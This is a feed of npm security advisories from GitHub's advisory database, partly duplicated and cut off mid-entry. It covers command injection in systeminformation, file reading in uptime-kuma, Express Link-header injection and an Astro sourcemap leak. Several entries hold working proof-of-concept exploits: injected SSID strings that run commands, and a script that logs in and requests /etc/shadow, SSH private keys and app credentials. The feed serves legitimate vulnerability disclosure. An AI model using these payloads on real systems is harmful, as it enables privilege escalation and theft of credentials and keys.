<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-12-22T08:01:30.940Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[systeminformation] Systeminformation has command injection vulnerability in getWindowsIEEE8021x (SSID)]]></title>
        <id>https://github.com/advisories/GHSA-cvv5-9h9w-qp2m</id>
        <link href="https://github.com/advisories/GHSA-cvv5-9h9w-qp2m"/>
        <updated>2024-12-20T21:37:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The SSID is not sanitized when before it is passed as a parameter to cmd.exe in the <code>getWindowsIEEE8021x</code> function. This means that malicious content in the SSID can be executed as OS commands. </p>
<h3 id="details">Details</h3>
<p>I have exploited this vulnerability in a Windows service using version 5.22.11 of the module, to escalate privileges (in an environment where I am authorized to do so). However, as far as I can see from the code, it is still present in master branch at time of writing, on line <a href="https://github.com/sebhildebrandt/systeminformation/blob/3a92931c7d46605ffddc1aacb97a9727273b2888/lib/network.js#L403">403/404 of network.js</a>.</p>
<p>The SSID is obtained from <code>netsh wlan show interface ...</code> in <code>getWindowsWirelessIfaceSSID</code>, and then passed to <code>cmd.exe /d /s /c "netsh wlan show profiles ...</code> in <code>getWindowsIEEE8021x</code>, without sanitization.</p>
<h3 id="poc">PoC</h3>
<p>First, the command injection payload should be included in the connected Wi-Fi SSID. For example create hotspot on mobile phone or other laptop, set SSID to payload, connect to it with victim Windows system. Two example SSID's to demonstrate exploitation are below.</p>
<p>Demonstration to run ping command indefinitely:</p>
<pre><code>a" | ping /t 127.0.0.1 &amp;
</code></pre>
<p>Run executable with privileges of the user in which vulnerable function is executed. Chosen executable should should be placed in (assuming system drive is C): <code>C:\a\a.exe</code>.</p>
<pre><code>a" | %SystemDrive%\a\a.exe &amp;
</code></pre>
<p>Then, the vulnerable function can be executed on the victim system, for example, using:</p>
<pre><code>const si = require('systeminformation');
si.networkInterfaces((net) =&gt; { console.log(net) });
</code></pre>
<p>Now the chosen command, <code>PING.exe</code> or <code>a.exe</code> will be run through the cmd.exe command line.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability may enable an attacker, depending on how the package is used, to perform remote code execution or local privilege escalation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-cvv5-9h9w-qp2m">https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-cvv5-9h9w-qp2m</a></li>
<li><a href="https://github.com/sebhildebrandt/systeminformation/commit/f7af0a67b78e7894335a6cad510566a25e06ae41">https://github.com/sebhildebrandt/systeminformation/commit/f7af0a67b78e7894335a6cad510566a25e06ae41</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56334">https://nvd.nist.gov/vuln/detail/CVE-2024-56334</a></li>
<li><a href="https://github.com/advisories/GHSA-cvv5-9h9w-qp2m">https://github.com/advisories/GHSA-cvv5-9h9w-qp2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvv5-9h9w-qp2m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-20T19:13:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] uptime-kuma vulnerable to Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor]]></title>
        <id>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</id>
        <link href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h"/>
        <updated>2024-12-20T21:36:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An <strong>Improper URL Handling Vulnerability</strong> allows an attacker to access sensitive local files on the server by exploiting the <code>file:///</code> protocol. This vulnerability is triggered via the <strong>"real-browser"</strong> request type, which takes a screenshot of the URL provided by the attacker. By supplying local file paths, such as <code>file:///etc/passwd</code>, an attacker can read sensitive data from the server.</p>
<h3 id="details">Details</h3>
<p>The vulnerability arises because the system does not properly validate or sanitize the user input for the URL field. Specifically:</p>
<ol>
<li><p>The URL input (<code>&lt;input data-v-5f5c86d7="" id="url" type="url" class="form-control" pattern="https?://.+" required=""&gt;</code>) allows users to input arbitrary file paths, including those using the <code>file:///</code> protocol, without server-side validation.</p>
</li>
<li><p>The server then uses the user-provided URL to make a request, passing it to a browser instance that performs the "real-browser" request, which takes a screenshot of the content at the given URL. If a local file path is entered (e.g., <code>file:///etc/passwd</code>), the browser fetches and captures the file’s content.</p>
</li>
</ol>
<pre><code class="language-javascript">const browser = await getBrowser();
const context = await browser.newContext();
const page = await context.newPage();

const res = await page.goto(monitor.url, {
    waitUntil: "networkidle",
    timeout: monitor.interval * 1000 * 0.8,
});

let filename = jwt.sign(monitor.id, server.jwtSecret) + ".png";

await page.screenshot({
    path: path.join(Database.screenshotDir, filename),
});

await context.close();
</code></pre>
<p>Since the user input is not validated, an attacker can manipulate the URL to request local files (e.g., <code>file:///etc/passwd</code>), and the system will capture a screenshot of the file's content, potentially exposing sensitive data.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><strong>Instructions</strong>:<ul>
<li>Enter a local file path as the URL, such as: <code>view-source:file:///etc/passwd</code>.</li>
<li>The server will process the URL and, in "real-browser" mode, capture a screenshot of the file content.</li>
</ul>
</li>
</ol>
<p>Example PoC:</p>
<ol>
<li>Log in to the application with valid credentials:</li>
</ol>
<pre><code class="language-javascript">const { io } = require("socket.io-client");

// Server configuration and credentials
const CONFIG = {
  serverUrl: "ws://localhost:3001",
  credentials: {
    username: "admin",
    password: "password1"
  },
  requestType: {
    REAL_BROWSER: "real-browser",
    HTTP: "http"
  },
  urlHeader: {
    VIEW_SOURCE: "view-source:file:///",
    FILE: "file:///"
  }
};

// List of sensitive files on a Linux system
const SENSITIVE_FILES = [
  "/etc/passwd",
  "/etc/shadow",
  "/etc/hosts",
  "/etc/hostname",
  "/etc/network/interfaces", // May vary depending on the distribution
  "/etc/ssh/ssh_config",
  "/etc/ssh/sshd_config",
  "~/.ssh/authorized_keys",
  "~/.ssh/id_rsa",
  "/etc/ssl/private/*.key",
  "/etc/ssl/certs/*.crt",
  "/app/data/kuma.db", // Uptime Kuma database file
  "/app/data/config.json" // Uptime Kuma configuration file
];

// Function to send a request and wait for the response
function sendRequest(socket, filePath, type) {
  return new Promise((resolve, reject) =&gt; {
    fileUrl = CONFIG.urlHeader.VIEW_SOURCE + filePath;
    if (type == CONFIG.requestType.HTTP) {
      fileUrl = CONFIG.urlHeader.FILE + filePath;
    }
    socket.emit("add", {
      type: type,
      name: type + " " + filePath,
      url: fileUrl,
      method: "GET",
      maxretries: 0,
      timeout: 500,
      notificationIDList: {},
      ignoreTls: true,
      upsideDown: false,
      accepted_statuscodes: ["200-299"]
    }, (res) =&gt; {
      console.log(`Response for file ${filePath}:`, res);
      resolve();
    });
  });
}

// Main function for connecting and sending the 'add' request
(async () =&gt; {
  const socket = io(CONFIG.serverUrl);

  // Handle connection errors
  socket.on("connect_error", (err) =&gt; {
    console.error("Connection failed:", err.message);
  });

  try {
    // Connecting with credentials
    await new Promise((resolve, reject) =&gt; {
      socket.emit("login", {
        username: CONFIG.credentials.username,
        password: CONFIG.credentials.password,
        token: ""
      }, (res) =&gt; {
        if (res.ok) {
          console.log("Connection successful");
          resolve();
        } else {
          console.log(res);
          reject(new Error("Connection failed"));
        }
      });
    });

    // Sending requests for each file using Promise.all to ensure synchronization
    const realBrowserRequests = SENSITIVE_FILES.map(filePath =&gt; sendRequest(socket, filePath, CONFIG.requestType.REAL_BROWSER));

    // Wait for all requests to be sent
    await Promise.all([...realBrowserRequests]);

    // Close the socket after all requests have been sent
    socket.close();
    console.log("Connection closed after all requests.");

  } catch (error) {
    console.error("Error:", error.message);
    socket.close();
  }
})();
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability is a <strong>Local File Inclusion (LFI)</strong> issue, which allows an attacker to access and potentially exfiltrate sensitive files from the server. The impact is significant, as attackers can access critical system files or application configuration files, such as:</p>
<ul>
<li><code>/etc/passwd</code>: Contains user account information.</li>
<li><code>/etc/shadow</code>: Contains password hashes.</li>
<li><code>/app/data/kuma.db</code>: Contains the database for the Uptime Kuma monitoring tool.</li>
<li><code>/app/data/config.json</code>: Contains the database credentials for Uptime Kuma.</li>
</ul>
<p>Any <strong>authenticated user</strong> who can submit a URL in "real-browser" mode is at risk of exposing sensitive data through screenshots of these files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875">https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/releases/tag/1.23.16">https://github.com/louislam/uptime-kuma/releases/tag/1.23.16</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56331">https://nvd.nist.gov/vuln/detail/CVE-2024-56331</a></li>
<li><a href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/advisories/GHSA-2qgm-m29m-cj2h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-20T15:10:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] uptime-kuma vulnerable to Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor]]></title>
        <id>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</id>
        <link href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h"/>
        <updated>2024-12-20T21:36:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An <strong>Improper URL Handling Vulnerability</strong> allows an attacker to access sensitive local files on the server by exploiting the <code>file:///</code> protocol. This vulnerability is triggered via the <strong>"real-browser"</strong> request type, which takes a screenshot of the URL provided by the attacker. By supplying local file paths, such as <code>file:///etc/passwd</code>, an attacker can read sensitive data from the server.</p>
<h3 id="details">Details</h3>
<p>The vulnerability arises because the system does not properly validate or sanitize the user input for the URL field. Specifically:</p>
<ol>
<li><p>The URL input (<code>&lt;input data-v-5f5c86d7="" id="url" type="url" class="form-control" pattern="https?://.+" required=""&gt;</code>) allows users to input arbitrary file paths, including those using the <code>file:///</code> protocol, without server-side validation.</p>
</li>
<li><p>The server then uses the user-provided URL to make a request, passing it to a browser instance that performs the "real-browser" request, which takes a screenshot of the content at the given URL. If a local file path is entered (e.g., <code>file:///etc/passwd</code>), the browser fetches and captures the file’s content.</p>
</li>
</ol>
<pre><code class="language-javascript">const browser = await getBrowser();
const context = await browser.newContext();
const page = await context.newPage();

const res = await page.goto(monitor.url, {
    waitUntil: "networkidle",
    timeout: monitor.interval * 1000 * 0.8,
});

let filename = jwt.sign(monitor.id, server.jwtSecret) + ".png";

await page.screenshot({
    path: path.join(Database.screenshotDir, filename),
});

await context.close();
</code></pre>
<p>Since the user input is not validated, an attacker can manipulate the URL to request local files (e.g., <code>file:///etc/passwd</code>), and the system will capture a screenshot of the file's content, potentially exposing sensitive data.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><strong>Instructions</strong>:<ul>
<li>Enter a local file path as the URL, such as: <code>view-source:file:///etc/passwd</code>.</li>
<li>The server will process the URL and, in "real-browser" mode, capture a screenshot of the file content.</li>
</ul>
</li>
</ol>
<p>Example PoC:</p>
<ol>
<li>Log in to the application with valid credentials:</li>
</ol>
<pre><code class="language-javascript">const { io } = require("socket.io-client");

// Server configuration and credentials
const CONFIG = {
  serverUrl: "ws://localhost:3001",
  credentials: {
    username: "admin",
    password: "password1"
  },
  requestType: {
    REAL_BROWSER: "real-browser",
    HTTP: "http"
  },
  urlHeader: {
    VIEW_SOURCE: "view-source:file:///",
    FILE: "file:///"
  }
};

// List of sensitive files on a Linux system
const SENSITIVE_FILES = [
  "/etc/passwd",
  "/etc/shadow",
  "/etc/hosts",
  "/etc/hostname",
  "/etc/network/interfaces", // May vary depending on the distribution
  "/etc/ssh/ssh_config",
  "/etc/ssh/sshd_config",
  "~/.ssh/authorized_keys",
  "~/.ssh/id_rsa",
  "/etc/ssl/private/*.key",
  "/etc/ssl/certs/*.crt",
  "/app/data/kuma.db", // Uptime Kuma database file
  "/app/data/config.json" // Uptime Kuma configuration file
];

// Function to send a request and wait for the response
function sendRequest(socket, filePath, type) {
  return new Promise((resolve, reject) =&gt; {
    fileUrl = CONFIG.urlHeader.VIEW_SOURCE + filePath;
    if (type == CONFIG.requestType.HTTP) {
      fileUrl = CONFIG.urlHeader.FILE + filePath;
    }
    socket.emit("add", {
      type: type,
      name: type + " " + filePath,
      url: fileUrl,
      method: "GET",
      maxretries: 0,
      timeout: 500,
      notificationIDList: {},
      ignoreTls: true,
      upsideDown: false,
      accepted_statuscodes: ["200-299"]
    }, (res) =&gt; {
      console.log(`Response for file ${filePath}:`, res);
      resolve();
    });
  });
}

// Main function for connecting and sending the 'add' request
(async () =&gt; {
  const socket = io(CONFIG.serverUrl);

  // Handle connection errors
  socket.on("connect_error", (err) =&gt; {
    console.error("Connection failed:", err.message);
  });

  try {
    // Connecting with credentials
    await new Promise((resolve, reject) =&gt; {
      socket.emit("login", {
        username: CONFIG.credentials.username,
        password: CONFIG.credentials.password,
        token: ""
      }, (res) =&gt; {
        if (res.ok) {
          console.log("Connection successful");
          resolve();
        } else {
          console.log(res);
          reject(new Error("Connection failed"));
        }
      });
    });

    // Sending requests for each file using Promise.all to ensure synchronization
    const realBrowserRequests = SENSITIVE_FILES.map(filePath =&gt; sendRequest(socket, filePath, CONFIG.requestType.REAL_BROWSER));

    // Wait for all requests to be sent
    await Promise.all([...realBrowserRequests]);

    // Close the socket after all requests have been sent
    socket.close();
    console.log("Connection closed after all requests.");

  } catch (error) {
    console.error("Error:", error.message);
    socket.close();
  }
})();
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability is a <strong>Local File Inclusion (LFI)</strong> issue, which allows an attacker to access and potentially exfiltrate sensitive files from the server. The impact is significant, as attackers can access critical system files or application configuration files, such as:</p>
<ul>
<li><code>/etc/passwd</code>: Contains user account information.</li>
<li><code>/etc/shadow</code>: Contains password hashes.</li>
<li><code>/app/data/kuma.db</code>: Contains the database for the Uptime Kuma monitoring tool.</li>
<li><code>/app/data/config.json</code>: Contains the database credentials for Uptime Kuma.</li>
</ul>
<p>Any <strong>authenticated user</strong> who can submit a URL in "real-browser" mode is at risk of exposing sensitive data through screenshots of these files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875">https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/releases/tag/1.23.16">https://github.com/louislam/uptime-kuma/releases/tag/1.23.16</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56331">https://nvd.nist.gov/vuln/detail/CVE-2024-56331</a></li>
<li><a href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/advisories/GHSA-2qgm-m29m-cj2h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-20T15:10:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[express] Express ressource injection]]></title>
        <id>https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</id>
        <link href="https://github.com/advisories/GHSA-cm5g-3pgc-8rg4"/>
        <updated>2024-12-19T17:52:11.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been identified in the Express response.links&nbsp;function, allowing for arbitrary resource injection in the Link&nbsp;header when unsanitized data is used.</p>
<p>The issue arises from improper sanitization in <code>Link</code> header values, which can allow a combination of characters like <code>,</code>, <code>;</code>, and <code>&lt;&gt;</code> to preload malicious resources.</p>
<p>This vulnerability is especially relevant for dynamic parameters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-10491">https://nvd.nist.gov/vuln/detail/CVE-2024-10491</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-10491">https://www.herodevs.com/vulnerability-directory/cve-2024-10491</a></li>
<li><a href="https://github.com/expressjs/express/issues/6222">https://github.com/expressjs/express/issues/6222</a></li>
<li><a href="https://github.com/advisories/GHSA-cm5g-3pgc-8rg4">https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-29T18:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[astro] Astro's server source code is exposed to the public if sourcemaps are enabled]]></title>
        <id>https://github.com/advisories/GHSA-49w6-73cw-chjr</id>
        <link href="https://github.com/advisories/GHSA-49w6-73cw-chjr"/>
        <updated>2024-12-19T21:38:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A bug in the build process allows any unauthenticated user to read parts of the server source code.</p>
<h3 id="details">Details</h3>
<p>During build, along with client assets such as css and font files, the sourcemap files <strong>for the server code</strong> are moved to a publicly-accessible folder.
<a href="https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></p>
<p>Any outside party can read them with an unauthorized HTTP GET request to the same server hosting the rest of the website.</p>
<p>While some server files are hashed, making their access obscure, the files corresponding to the file system router (those in <code>src/pages</code>) are predictably named. For example. the sourcemap file for <code>src/pages/index.astro</code> gets named <code>dist/client/pages/index.astro.mjs.map</code>.</p>
<h3 id="poc">PoC</h3>
<p>Here is one example of an affected open-source website:
<a href="https://creatorsgarten.org/pages/index.astro.mjs.map">https://creatorsgarten.org/pages/index.astro.mjs.map</a></p>
<img src="https://github.com/user-attachments/assets/773c5532-87af-42b8-838e-8f5472bf9f68" height="263" width="500">

<p>The file can be saved and opened using <a href="https://evanw.github.io/source-map-visualization/">https://evanw.github.io/source-map-visualization/</a> to reconstruct the source code.</p>
<img src="https://github.com/user-attachments/assets/7d35d0ca-3a29-4666-be21-cfefe311ac9d" height="271" width="500">

<p>The above accurately mirrors the source code as seen in the repository: <a href="https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro">https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro</a></p>
<img src="https://github.com/user-attachments/assets/39e77197-8382-4556-a024-c526dacccc1c" height="298" width="500">


<p>The above was found as the 4th result (and the first one on Astro 5.0+) when making the following search query on GitHub.com (<a href="https://github.com/search?q=path%3Aastro.config.mjs+%40sentry%2Fastro&amp;type=code">search results link</a>):</p>
<pre><code>path:astro.config.mjs @sentry/astro
</code></pre>
<p>This vulnerability is the root cause of <a href="https://github.com/withastro/astro/issues/12703">https://github.com/withastro/astro/issues/12703</a>, which links to a simple stackblitz project demonstrating the vulnerability. Upon build, notice the contents of the <code>dist/client</code> (referred to as <code>config.build.client</code> in astro code) folder. All astro servers make the folder in question accessible to the public internet without any authentication. It contains <code>.map</code> files corresponding to the code that runs on the server.</p>
<h3 id="impact">Impact</h3>
<p>All <strong>server-output</strong> (SSR) projects on Astro 5 versions <strong>v5.0.3</strong> through <strong>v5.0.6</strong> (inclusive), that have <strong>sourcemaps enabled</strong>, either directly or through an add-on such as <a href="https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50">sentry</a>, are affected. The fix for <strong>server-output</strong> projects was released in <strong><a href="mailto:astro@5.0.7">astro@5.0.7</a></strong>.</p>
<p>Additionally, all <strong>static-output</strong> (SSG) projects built using Astro 4 versions <strong>4.16.17 or older</strong>, or Astro 5 versions <strong>5.0.7 or older</strong>, that have <strong>sourcemaps enabled</strong> are also affected. The fix for <strong>static-output</strong> projects was released in <strong><a href="mailto:astro@5.0.8">astro@5.0.8</a></strong>, and backported to Astro v4 in <strong><a href="mailto:astro@4.16.18">astro@4.16.18</a></strong>.</p>
<p>The immediate impact is limited to source code. Any secrets or environment variables are not exposed unless they are present verbatim in the source code.</p>
<p>There is no immediate loss of integrity within the the vulnerable server. However, it is possible to subsequently discover another vulnerability via the revealed source code .</p>
<p>There is no immediate impact to availability of the vulnerable server. However, the presence of an unsafe regular expression, for example, can quickly be exploited to subsequently compromise the availability.</p>
<ul>
<li>Network attack vector.</li>
<li>Low attack complexity.</li>
<li>No privileges required.</li>
<li>No interaction required from an authorized user.</li>
<li>Scope is limited to first party. Although the source code of closed-source third-party software may also be exposed.</li>
</ul>
<h3 id="remediation">Remediation</h3>
<p>The fix for <strong>server-output</strong> projects was released in <strong><a href="mailto:astro@5.0.7">astro@5.0.7</a></strong>, and the fix for <strong>static-output</strong> projects was released in <strong><a href="mailto:astro@5.0.8">astro@5.0.8</a></strong> and backported to Astro v4 in <strong><a href="mailto:astro@4.16.18">astro@4.16.18</a></strong>. Users are advised to update immediately if they are using sourcemaps or an integration that enables sourcemaps.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr">https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr</a></li>
<li><a href="https://github.com/withastro/astro/issues/12703">https://github.com/withastro/astro/issues/12703</a></li>
<li><a href="https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515">https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515</a></li>
<li><a href="https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5">https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5</a></li>
<li><a href="https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56159">https://nvd.nist.gov/vuln/detail/CVE-2024-56159</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50">https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50</a></li>
<li><a href="https://github.com/advisories/GHSA-49w6-73cw-chjr">https://github.com/advisories/GHSA-49w6-73cw-chjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-49w6-73cw-chjr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-19T15:12:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[astro] Astro's server source code is exposed to the public if sourcemaps are enabled]]></title>
        <id>https://github.com/advisories/GHSA-49w6-73cw-chjr</id>
        <link href="https://github.com/advisories/GHSA-49w6-73cw-chjr"/>
        <updated>2024-12-19T21:38:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A bug in the build process allows any unauthenticated user to read parts of the server source code.</p>
<h3 id="details">Details</h3>
<p>During build, along with client assets such as css and font files, the sourcemap files <strong>for the server code</strong> are moved to a publicly-accessible folder.
<a href="https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></p>
<p>Any outside party can read them with an unauthorized HTTP GET request to the same server hosting the rest of the website.</p>
<p>While some server files are hashed, making their access obscure, the files corresponding to the file system router (those in <code>src/pages</code>) are predictably named. For example. the sourcemap file for <code>src/pages/index.astro</code> gets named <code>dist/client/pages/index.astro.mjs.map</code>.</p>
<h3 id="poc">PoC</h3>
<p>Here is one example of an affected open-source website:
<a href="https://creatorsgarten.org/pages/index.astro.mjs.map">https://creatorsgarten.org/pages/index.astro.mjs.map</a></p>
<img src="https://github.com/user-attachments/assets/773c5532-87af-42b8-838e-8f5472bf9f68" height="263" width="500">

<p>The file can be saved and opened using <a href="https://evanw.github.io/source-map-visualization/">https://evanw.github.io/source-map-visualization/</a> to reconstruct the source code.</p>
<img src="https://github.com/user-attachments/assets/7d35d0ca-3a29-4666-be21-cfefe311ac9d" height="271" width="500">

<p>The above accurately mirrors the source code as seen in the repository: <a href="https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro">https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro</a></p>
<img src="https://github.com/user-attachments/assets/39e77197-8382-4556-a024-c526dacccc1c" height="298" width="500">


<p>The above was found as the 4th result (and the first one on Astro 5.0+) when making the following search query on GitHub.com (<a href="https://github.com/search?q=path%3Aastro.config.mjs+%40sentry%2Fastro&amp;type=code">search results link</a>):</p>
<pre><code>path:astro.config.mjs @sentry/astro
</code></pre>
<p>This vulnerability is the root cause of <a href="https://github.com/withastro/astro/issues/12703">https://github.com/withastro/astro/issues/12703</a>, which links to a simple stackblitz project demonstrating the vulnerability. Upon build, notice the contents of the <code>dist/client</code> (referred to as <code>config.build.client</code> in astro code) folder. All astro servers make the folder in question accessible to the public internet without any authentication. It contains <code>.map</code> files corresponding to the code that runs on the server.</p>
<h3 id="impact">Impact</h3>
<p>All <strong>server-output</strong> (SSR) projects on Astro 5 versions <strong>v5.0.3</strong> through <strong>v5.0.6</strong> (inclusive), that have <strong>sourcemaps enabled</strong>, either directly or through an add-on such as <a href="https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50">sentry</a>, are affected. The fix for <strong>server-output</strong> projects was released in <strong><a href="mailto:astro@5.0.7">astro@5.0.7</a></strong>.</p>
<p>Additionally, all <strong>static-output</strong> (SSG) projects built using Astro 4 versions <strong>4.16.17 or older</strong>, or Astro 5 versions <strong>5.0.7 or older</strong>, that have <strong>sourcemaps enabled</strong> are also affected. The fix for <strong>static-output</strong> projects was released in <strong><a href="mailto:astro@5.0.8">astro@5.0.8</a></strong>, and backported to Astro v4 in <strong><a href="mailto:astro@4.16.18">astro@4.16.18</a></strong>.</p>
<p>The immediate impact is limited to source code. Any secrets or environment variables are not exposed unless they are present verbatim in the source code.</p>
<p>There is no immediate loss of integrity within the the vulnerable server. However, it is possible to subsequently discover another vulnerability via the revealed source code .</p>
<p>There is no immediate impact to availability of the vulnerable server. However, the presence of an unsafe regular expression, for example, can quickly be exploited to subsequently compromise the availability.</p>
<ul>
<li>Network attack vector.</li>
<li>Low attack complexity.</li>
<li>No privileges required.</li>
<li>No interaction required from an authorized user.</li>
<li>Scope is limited to first party. Although the source code of closed-source third-party software may also be exposed.</li>
</ul>
<h3 id="remediation">Remediation</h3>
<p>The fix for <strong>server-output</strong> projects was released in <strong><a href="mailto:astro@5.0.7">astro@5.0.7</a></strong>, and the fix for <strong>static-output</strong> projects was released in <strong><a href="mailto:astro@5.0.8">astro@5.0.8</a></strong> and backported to Astro v4 in <strong><a href="mailto:astro@4.16.18">astro@4.16.18</a></strong>. Users are advised to update immediately if they are using sourcemaps or an integration that enables sourcemaps.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr">https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr</a></li>
<li><a href="https://github.com/withastro/astro/issues/12703">https://github.com/withastro/astro/issues/12703</a></li>
<li><a href="https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515">https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515</a></li>
<li><a href="https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5">https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5</a></li>
<li><a href="https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></li>
